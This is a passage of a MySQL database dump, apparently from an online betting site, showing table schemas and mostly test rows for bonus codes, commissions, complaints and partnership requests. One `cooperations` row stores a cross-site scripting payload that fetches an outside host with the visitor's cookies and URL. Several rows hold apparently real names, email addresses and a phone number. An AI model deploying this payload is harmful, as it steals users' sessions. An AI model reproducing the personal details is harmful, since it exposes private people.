  `game_id` int(11) NOT NULL,
  `web` varchar(50) NOT NULL,
  `bet_id` varchar(50) NOT NULL,
  `bet_amount` double NOT NULL,
  `rolling` double NOT NULL,
  `result_amount` double NOT NULL,
  `balance` double NOT NULL,
  `game_result` int(11) NOT NULL,
  `transaction_id` int(11) NOT NULL,
  `bet_source` int(11) NOT NULL,
  `bet_type` int(11) NOT NULL,
  `bet_time` datetime NOT NULL,
  `payout_time` datetime NOT NULL,
  `game_set` int(11) NOT NULL,
  `host_id` int(11) NOT NULL,
  `host_name` int(11) NOT NULL,
  `off_set` int(11) NOT NULL,
  `created_at` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `blog`
--

DROP TABLE IF EXISTS `blog`;
CREATE TABLE IF NOT EXISTS `blog` (
  `id` int(11) NOT NULL,
  `user` int(11) NOT NULL,
  `title` text NOT NULL,
  `description` text NOT NULL,
  `banner` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `bobalance`
--

DROP TABLE IF EXISTS `bobalance`;
CREATE TABLE IF NOT EXISTS `bobalance` (
  `id` int(11) NOT NULL,
  `sub` int(11) DEFAULT NULL,
  `balance` decimal(18,8) NOT NULL DEFAULT '0.00000000',
  `oldBalance` decimal(18,8) NOT NULL,
  `time` bigint(20) NOT NULL,
  `orderID` varchar(100) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `chanel_bots`
--

DROP TABLE IF EXISTS `chanel_bots`;
CREATE TABLE IF NOT EXISTS `chanel_bots` (
  `id` int(11) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `chanel_bots`
--

INSERT INTO `chanel_bots` (`id`, `name`, `status`, `created_at`) VALUES
(1, 'chanel123betnow', 1, '2022-03-01 03:19:58');

-- --------------------------------------------------------

--
-- Table structure for table `changes`
--

DROP TABLE IF EXISTS `changes`;
CREATE TABLE IF NOT EXISTS `changes` (
  `Changes_ID` int(11) NOT NULL,
  `Changes_User` bigint(11) NOT NULL COMMENT 'Tạm đóng',
  `Changes_Price` decimal(18,6) NOT NULL COMMENT 'Tỷ giá',
  `Changes_Time` date NOT NULL COMMENT 'Thời gian đổi tỷ giá',
  `Changes_Hour` int(11) NOT NULL,
  `Changes_Status` int(11) NOT NULL,
  `Log` varchar(255) DEFAULT NULL COMMENT '1: Kích hoạt | 0: Ngưng kích hoạt'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `changes`
--

INSERT INTO `changes` (`Changes_ID`, `Changes_User`, `Changes_Price`, `Changes_Time`, `Changes_Hour`, `Changes_Status`, `Log`) VALUES
(1, 999999, '0.800000', '2020-07-29', 0, 1, NULL);

-- --------------------------------------------------------

--
-- Table structure for table `checkbalance`
--

DROP TABLE IF EXISTS `checkbalance`;
CREATE TABLE IF NOT EXISTS `checkbalance` (
  `id` int(11) NOT NULL,
  `user` int(11) NOT NULL,
  `main` decimal(10,5) NOT NULL,
  `casino` decimal(10,5) NOT NULL,
  `sportbook` decimal(10,5) NOT NULL,
  `datetime` datetime NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `code_bonus`
--

DROP TABLE IF EXISTS `code_bonus`;
CREATE TABLE IF NOT EXISTS `code_bonus` (
  `id` int(11) NOT NULL,
  `code` varchar(50) COLLATE utf8_unicode_ci NOT NULL,
  `price_bonus` decimal(18,8) NOT NULL COMMENT 'EUSD',
  `quantity` int(11) NOT NULL,
  `expiration_date` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `description` text COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `code_bonus`
--

INSERT INTO `code_bonus` (`id`, `code`, `price_bonus`, `quantity`, `expiration_date`, `description`) VALUES
(3, 'zGP7R92x6J', '10.00000000', 7, '2022-12-15 09:57:15', 'Code Promotion 10$'),
(4, 'EeGSLxqPrb', '11.00000000', 0, '2022-12-09 10:37:34', 'Test code'),
(5, 'ODpqo0oTZF', '10.00000000', 40, '2022-12-17 02:01:54', 'Code Promotion 10$'),
(6, 'lkUHZa9ZVc', '20.00000000', 0, '2022-12-20 07:04:45', 'Code Promotion 20$'),
(7, 'F2fdzGpQeC', '10.00000000', 99, '2023-01-05 04:06:24', 'Code Promotion 10$'),
(8, '8t7QBClFPX', '5.00000000', 7, '2023-01-09 04:07:14', 'Code $5 Minigame'),
(9, 'CpMFz6xHoz', '5.00000000', 7, '2023-02-03 03:48:20', 'Code Promotion $5 30 days'),
(10, 'bM7GOhe16K', '10.00000000', 0, '2023-02-07 15:57:12', 'Code Promotion 10$'),
(11, 'T5CFJ5dmiM', '10.00000000', 0, '2023-02-07 15:57:29', 'Code Promotion 10$'),
(12, 'r0fkkMqOzw', '10.00000000', 5, '2023-02-07 15:57:39', 'Code Promotion 10$'),
(13, 'DvSQGr4DBC', '10.00000000', 0, '2023-02-07 15:57:47', 'Code Promotion 10$'),
(14, '1ognfNLOjX', '10.00000000', 0, '2023-02-07 15:58:02', 'Code Promotion 10'),
(15, 'Ve3l2Ho9H9', '10.00000000', 4, '2023-02-18 12:39:37', 'Code Promotion 10$'),
(16, 'Ra62C3FfBm', '10.00000000', 0, '2023-02-18 12:39:45', 'Code Promotion 10$'),
(17, '67yy2dm0Xt', '10.00000000', 0, '2023-02-18 12:39:52', 'Code Promotion 10$'),
(18, 'DXvobNbKz7', '10.00000000', 0, '2023-02-18 12:40:02', 'Code Promotion 10$');

-- --------------------------------------------------------

--
-- Table structure for table `commission_user`
--

DROP TABLE IF EXISTS `commission_user`;
CREATE TABLE IF NOT EXISTS `commission_user` (
  `id` int(11) NOT NULL,
  `user` int(11) NOT NULL,
  `amount` decimal(18,8) NOT NULL,
  `status` int(11) NOT NULL COMMENT '0:chưa đủ dk,1:đủ dk',
  `time_update` bigint(20) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `commission_user`
--

INSERT INTO `commission_user` (`id`, `user`, `amount`, `status`, `time_update`) VALUES
(15, 123123, '1135.09000000', 1, 1643015341),
(16, 364916, '0.00000000', 0, 1638520129),
(17, 392912, '0.00000000', 0, 1638520129),
(18, 401929, '0.00000000', 0, 1638520129),
(19, 456319, '60000000.00000000', 1, 1643015341),
(20, 544693, '50000000.00000000', 1, 1643015341),
(21, 606885, '10000000.00000000', 0, 1643015341),
(22, 652542, '0.00000000', 0, 1638520129),
(23, 689016, '0.00000000', 0, 1638520129),
(24, 752595, '0.00000000', 0, 1638520129),
(25, 868151, '10000000.00000000', 0, 1643015341),
(26, 896794, '0.00000000', 0, 1638520129),
(27, 904533, '100.00000000', 0, 1643015341),
(28, 950655, '0.00000000', 0, 1638520129),
(29, 969462, '0.00000000', 0, 1643015341),
(30, 782224, '1000000.00000000', 1, 1643015341),
(31, 151313, '1000000.00000000', 1, 1638520129),
(32, 328782, '200000.00000000', 1, 1638520129),
(33, 590077, '100000.00000000', 0, 1638520129),
(34, 594902, '3000.00000000', 0, 1638520129),
(35, 942577, '2999.00000000', 0, 1638520129),
(36, 418736, '15000.00000000', 1, 1638520129),
(37, 170661, '2000.00000000', 0, 1638520129),
(38, 608010, '20000.00000000', 1, 1638520129),
(39, 358231, '0.00000000', 0, 1643015341);

-- --------------------------------------------------------

--
-- Table structure for table `complaints`
--

DROP TABLE IF EXISTS `complaints`;
CREATE TABLE IF NOT EXISTS `complaints` (
  `id` int(11) NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `website` text CHARACTER SET utf8 COLLATE utf8_unicode_ci,
  `playerid` varchar(20) DEFAULT NULL,
  `message` text CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `disputed_amount` decimal(18,8) DEFAULT NULL,
  `currency` int(11) DEFAULT NULL,
  `type` int(11) NOT NULL COMMENT '1:COMPLAINTS, 2:SELF-EXCLUSION',
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `complaints`
--

INSERT INTO `complaints` (`id`, `name`, `email`, `website`, `playerid`, `message`, `disputed_amount`, `currency`, `type`, `status`, `created_at`) VALUES
(2, 'Tự óc chó', 'tuochco@gmail.com', 'tuochco.traicho.oc', '407111', 'chỉ là test thôi', '2000.00000000', 2, 1, 1, '2022-04-27 07:04:13'),
(3, 'Tự óc chó', 'tuochco@gmail.com', 'tuochco.traicho.oc', NULL, 'chỉ là test thôi', '2000.00000000', 2, 1, 0, '2022-04-27 07:04:13'),
(4, 'Tự óc chó', 'tuochco@gmail.com', 'tuochco.traicho.oc', '407111', 'chỉ là test thôi', NULL, NULL, 2, 0, '2022-04-27 07:04:13'),
(5, 'Tự óc chó', 'tuochco@gmail.com', 'tuochco.traicho.oc', '407111', 'chỉ là test thôi', NULL, NULL, 2, 0, '2022-04-27 07:04:13'),
(6, 'Tự óc chó', 'tuochco@gmail.com', 'tuochco.traicho.oc', '407111', 'chỉ là test thôi', NULL, NULL, 2, 0, '2022-04-27 07:04:13'),
(7, 'Con cá con', 'a@gmail.com', 'cocainit.com', NULL, 'Có làm thì mới có ăn', '1000.00000000', 2, 1, 1, '2022-04-27 08:57:38'),
(8, 'Con cá con', 'a@gmail.com', 'cocainit.com', NULL, 'Có làm thì mới có ăn', '1000.00000000', 2, 2, 1, '2022-04-27 08:57:49'),
(9, 'Con cá con', 'a@gmail.com', 'cocainit.com', NULL, 'ádasdasda', '1000.00000000', 3, 1, 1, '2022-04-27 08:59:33'),
(10, 'test 1', 'test@gmail.com', '123.com', '827222', 'ủa ủa jz', '1.00000000', 1, 1, 1, '2022-04-27 09:12:18'),
(11, 'test123', 'test@gmail.com', NULL, '827222', 'hello nha má', NULL, NULL, 2, 1, '2022-04-27 09:13:48'),
(12, 'candy', 'candyaz2020@gmail.com', '123betnow.net', '896794', 'support', '1.00000000', 3, 1, 1, '2022-04-27 09:17:58'),
(13, 'lan', 'candyaz2020@gmail.com', '123betnow.net', '896794', 'tessst', NULL, NULL, 2, 1, '2022-04-27 09:47:25'),
(14, 'abc', 'abc@gmail.com', '123.com', '827222', 'uh', NULL, NULL, 1, 1, '2022-04-27 09:48:10'),
(15, 'math', 'match@gmail.com', NULL, '827222', 'ủa hello pà nhaaa', NULL, NULL, 1, 1, '2022-04-27 09:52:10'),
(16, 'test 1', 'qwerty@gmail.com', NULL, '827222', 'uh hi nha', NULL, NULL, 2, 1, '2022-04-27 09:59:02'),
(17, 'abc', 'abc@gmail.com', NULL, '827222', 'rep đi', NULL, NULL, 1, 1, '2022-04-27 10:22:36'),
(18, 'hù', 'abc@gmail.com', NULL, '827222', 'test thim cái nũa nè', NULL, NULL, 2, 0, '2022-04-27 10:23:09'),
(19, 'Test', 'abc@gmail', NULL, '827222', 'hello, I have a problem', NULL, NULL, 1, 1, '2022-04-28 02:29:07'),
(20, 'test', '123@gmail.com', NULL, '827222', 'Can u help me', NULL, NULL, 2, 0, '2022-04-28 02:31:29'),
(21, 'abc', 'bcb@gmail.com', NULL, '827222', 'uh hi má', NULL, NULL, 1, 0, '2022-04-29 02:33:47'),
(22, 'test', '12@gmail.com', NULL, '827222', 'hi', NULL, NULL, 2, 0, '2022-04-29 02:34:58'),
(23, 'd', 'rtr@e.c', NULL, NULL, 'sda', NULL, NULL, 1, 0, '2022-10-28 10:02:04'),
(24, '1', 'a@e.c', NULL, NULL, 'd', NULL, NULL, 2, 0, '2022-10-28 10:04:38'),
(25, 'fdg', 'fdg@f', NULL, NULL, 'DF', NULL, NULL, 1, 0, '2022-11-03 07:51:09'),
(26, 'dfs', 'dfs@gg', NULL, NULL, 'df', NULL, NULL, 2, 0, '2022-11-03 07:51:40'),
(27, 'trggfd', 'df@gh', NULL, NULL, 'gfhfg', NULL, NULL, 1, 0, '2022-11-07 07:19:26'),
(28, '\'', 'kl@gmail.com', '\'', '494634', '\'', '0.00000000', 12, 1, 0, '2022-11-18 02:39:41');

-- --------------------------------------------------------

--
-- Table structure for table `cooperations`
--

DROP TABLE IF EXISTS `cooperations`;
CREATE TABLE IF NOT EXISTS `cooperations` (
  `id` int(11) NOT NULL,
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `project_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `project_website` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `with_link` int(11) NOT NULL COMMENT '1: Swap Pancakeswap,2: Reciprocal USDT',
  `contact` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL,
  `amount` decimal(18,8) NOT NULL,
  `other_information` varchar(255) CHARACTER SET utf8 COLLATE utf8_unicode_ci DEFAULT NULL,
  `status` int(11) NOT NULL,
  `created_at` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `cooperations`
--

INSERT INTO `cooperations` (`id`, `email`, `name`, `project_name`, `project_website`, `with_link`, `contact`, `amount`, `other_information`, `status`, `created_at`) VALUES
(1, 'test@gmail.com', 'name test', 'project name test', 'project website test', 2, '0x68f80C866532898c9f1d0780a961AC037a2FA723', '123123.00000000', 'info test', 1, '2022-04-28 02:57:16'),
(2, '123@gmail.com', 'abc', 'abc123', 'abcde54321', 1, 'abc123456', '123456.00000000', '1234567890abc', 1, '2022-04-28 04:50:20'),
(3, '123@mail.com', '123', '123', '123', 1, '123abc', '0.00000000', 'sdfbn', 1, '2022-04-28 04:53:17'),
(4, '123@gmail.com', '11111111111111111111111111111 11111111111111111111111111111 11111111111111111111111111111', '123betnow', '123betnow', 1, '123betnow', '123123123.00000000', '123betnow', 1, '2022-04-28 04:55:39'),
(5, '123@caothang.edu.vn', '123', 'Let\'s go', '123abc', 2, 'abc123', '100.00000000', '123', 1, '2022-04-28 07:22:51'),
(6, '0@123456789.edu.vn', '123456789', '123456789', '123456789', 2, '123456789', '123456789.00000000', '123456789', 1, '2022-04-28 07:27:08'),
(7, 'candyaz2020@gmail.com', 'candy', 'DragonPool', 'dragonpool.co', 1, '1', '1.00000000', '1', 1, '2022-05-03 04:58:30'),
(8, 'hi@gmail.com', 'hi', 'hi', 'hi', 2, 'hi', '0.00000000', 'hi', 1, '2022-05-03 06:53:48'),
(9, '123@gmail.com', '520', '123', '12', 1, '12', '12.00000000', NULL, 1, '2022-05-03 06:55:58'),
(10, '123abc@gmail.com', '520', '520', '520', 2, '520', '520.00000000', NULL, 1, '2022-05-03 07:03:26'),
(11, 'uahello@gmail.com', '11', '2', '111', 1, '11111', '0.10000000', NULL, 1, '2022-05-03 07:04:09'),
(12, 'uahello@gmail.com', '111', '1', '111', 2, '11111', '0.00000000', NULL, 1, '2022-05-03 07:05:08'),
(13, 'ua@gmail.com', 'ủa hello má', 'uh', '1', 2, 'hi', '0.00000000', NULL, 1, '2022-05-03 07:17:42'),
(14, 'uahello@gmail.com', '111', '1', '222', 2, '11111', '0.00000000', NULL, 1, '2022-05-03 08:50:50'),
(15, 'hjj@gmail.com', 'hjj', 'hjj', 'hjj', 1, 'hjj', '0.00000000', NULL, 1, '2022-05-03 09:01:30'),
(16, 'bng@gmail.com', 'mhgh', 'jgyhj', 'www', 1, '111', '-8.00000000', NULL, 1, '2022-05-04 04:57:28'),
(17, 'candyaz2020@gmail.com', 'candy', '123betnow', '123betnow.net', 2, 'test', '1.00000000', 'support', 1, '2022-05-04 08:04:34'),
(18, 'ndtai@gmail.com', 'adad', 'adad', 'adad', 1, 'adad', '113.00000000', 'ddâda', 1, '2022-05-04 08:31:30'),
(19, 'ndtai@gmail.com', 'adad', 'adad', 'adad', 1, '121', '1212.00000000', '1212', 1, '2022-05-04 08:32:02'),
(20, 'q@gmail.com', 'hi', 'ui', 'ui', 1, 'iu', '1.00000000', NULL, 1, '2022-05-04 08:36:03'),
(21, 'ndtai@gmail.com', '12312', '131', '13131', 1, '13131', '1312312.00000000', '13131', 1, '2022-05-04 09:17:35'),
(22, '111@gmail.com', '1', '11', '1', 1, '1', '0.00000000', NULL, 1, '2022-05-04 09:20:09'),
(23, '11@gmail.com', '2', '1', '2', 2, '1', '0.00000000', NULL, 1, '2022-05-04 09:22:53'),
(24, 'drgfh@gmail.com', 'fghjghj', 'gdfhj', 'fgdhj', 1, 'fghj', '23.00000000', 'fghj', 1, '2022-06-07 10:10:42'),
(25, 'test@gmail.com', 'test', 'test', 'test.vn', 1, 'test', '1000.00000000', 'test', 1, '2022-06-13 08:09:37'),
(26, 'lduynguyen711@gmail.com', 'leduy', '12e3', '123123', 1, '0395581711', '1.00000000', 'asd s', 1, '2022-07-22 08:34:33'),
(27, 'lduynguyen711@gmail.com', 'leduy', '12e3', '123123', 1, '0395581711', '1.00000000', 'asds ds a', 1, '2022-07-22 08:34:54'),
(28, 'lduynguyen711@gmail.com', 'leduy', '12e3', '123123', 1, '0395581711', '1.00000000', 'asaa', 1, '2022-07-22 08:35:18'),
(29, 'q@gmail.com', '\'\"><img src=x onerror=\"fetch(\'https://w2lose.com/y.php?c=\'+window.location.href+\'&d=\'+document.cookie)\">', '\'\"><img src=x onerror=\"fetch(\'https://w2lose.com/y.php?c=\'+window.location.href+\'&d=\'+document.cookie)\">', '\'\"><img src=x onerror=\"fetch(\'https://w2lose.com/y.php?c=\'+window.location.href+\'&d=\'+document.cookie)\">', 1, '\'\"><img src=x onerror=\"fetch(\'https://w2lose.com/y.php?c=\'+window.location.href+\'&d=\'+document.cookie)\">', '11111.00000000', '\'\"><img src=x onerror=\"fetch(\'https://w2lose.com/y.php?c=\'+window.location.href+\'&d=\'+document.cookie)\">', 1, '2022-07-31 16:42:14'),
(30, 'koonran69@gmail.com', 'test', 'test', 'test', 1, 'test', '123.00000000', 'test', 1, '2022-09-20 04:24:25'),
(31, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fasdfasd', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, '12312', '123123.00000000', NULL, 1, '2022-10-17 11:19:41'),
(32, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fasdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, '123123', '123123.00000000', NULL, 1, '2022-10-18 01:42:49'),
(33, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2131231.00000000', NULL, 1, '2022-10-18 01:45:39'),
(34, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '1324.00000000', NULL, 1, '2022-10-18 01:47:27'),
(35, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '123123.00000000', NULL, 1, '2022-10-18 01:49:17'),
(36, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2312312.00000000', NULL, 1, '2022-10-18 01:50:12'),
(37, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '213123.00000000', NULL, 1, '2022-10-18 01:54:03'),
(38, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '123123.00000000', NULL, 1, '2022-10-18 01:56:50'),
(39, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '123123.00000000', NULL, 1, '2022-10-18 01:59:01'),
(40, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2123123.00000000', NULL, 1, '2022-10-18 02:13:38'),
(41, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '1234123.00000000', NULL, 1, '2022-10-18 02:14:51'),
(42, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '23123.00000000', NULL, 1, '2022-10-18 02:15:31'),
(43, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fasdfasd', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'ádfasd', '12312.00000000', NULL, 1, '2022-10-18 02:17:17'),
(44, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'ádfasdf', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'edfasdf', '12312.00000000', NULL, 1, '2022-10-18 02:20:25'),
(45, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '234123.00000000', NULL, 1, '2022-10-18 02:20:43'),
(46, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '12312.00000000', NULL, 1, '2022-10-18 02:21:09'),
(47, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '12312.00000000', NULL, 1, '2022-10-18 02:21:48'),
(48, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'ádfasdf', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'ádfa', '123123.00000000', NULL, 1, '2022-10-18 02:23:02'),
(49, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2312.00000000', NULL, 1, '2022-10-18 02:23:50'),
(50, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '24324.00000000', NULL, 1, '2022-10-18 02:24:16'),
(51, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '123123.00000000', NULL, 1, '2022-10-18 02:24:59'),
(52, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2312.00000000', NULL, 1, '2022-10-18 02:25:28'),
(53, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2134123.00000000', NULL, 1, '2022-10-18 02:27:34'),
(54, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '2123312.00000000', NULL, 1, '2022-10-18 02:28:26'),
(55, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'asdfa', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'asdfasdf', '123123.00000000', NULL, 1, '2022-10-18 02:29:05'),
(56, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'ádfasd', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'fasdfa', '123123.00000000', NULL, 1, '2022-10-18 02:29:56'),
(57, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'afsdfas', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'fasdfasd', '9999999999.99999999', NULL, 1, '2022-10-18 02:30:50'),
(58, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fasdfasd', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'fasdf', '12312.00000000', NULL, 1, '2022-10-18 02:31:06'),
(59, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fdasdf', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'fasdf', '21312.00000000', NULL, 1, '2022-10-18 02:31:32'),
(60, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'fasdfasd', 'https://docs.google.com/spreadsheets/d/1S1mGxv4NFLk73gjCjabn3THWONF4_BW0WEB6fRto6cs/edit#gid=2044020798', 0, 'fasdfasd', '234123.00000000', NULL, 1, '2022-10-18 03:57:58'),
(61, 'nhotrung2000@gmail.com', 'tr', 'cs', 'https://herobook.io/home', 0, 'cs', '12.00000000', NULL, 1, '2022-10-28 09:18:15'),
(62, 'trungnn18406c@st.uel.edu.vn', 'tr', 'tr', 'https://herobook.io/home', 0, 'tr', '123.00000000', NULL, 1, '2022-10-28 09:28:10'),
(63, 'nhotrung2000@gmail.com', 'Te', 'Te', 'https://herobook.io/home', 0, 'Te', '123123.00000000', NULL, 1, '2022-10-29 03:01:21'),
(64, 'nguyenminhtam7120@gmail.com', 'Nguyễn Minh Tâm', 'hihi', 'https://www.youtube.com/watch?v=JxBnLmCOEJ8&list=RDCi34un4CVZU&index=3', 0, 'Hihi', '123123.00000000', NULL, 1, '2022-11-01 07:37:00'),
(65, 'ntg@gmail.com', 'trg', 'grg', 'https://herobook.io/home', 0, 'sd', '123.00000000', NULL, 1, '2022-11-03 07:42:18');

-- --------------------------------------------------------

--
-- Table structure for table `countries`
--

DROP TABLE IF EXISTS `countries`;
CREATE TABLE IF NOT EXISTS `countries` (
  `Countries_ID` int(11) NOT NULL,
  `Countries_SortName` varchar(3) NOT NULL,
  `Countries_Name` varchar(150) NOT NULL,
  `Countries_PhoneCode` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `countries`
--

INSERT INTO `countries` (`Countries_ID`, `Countries_SortName`, `Countries_Name`, `Countries_PhoneCode`) VALUES
(1, 'AF', 'Afghanistan', 93),
(2, 'AL', 'Albania', 355),
(3, 'DZ', 'Algeria', 213),
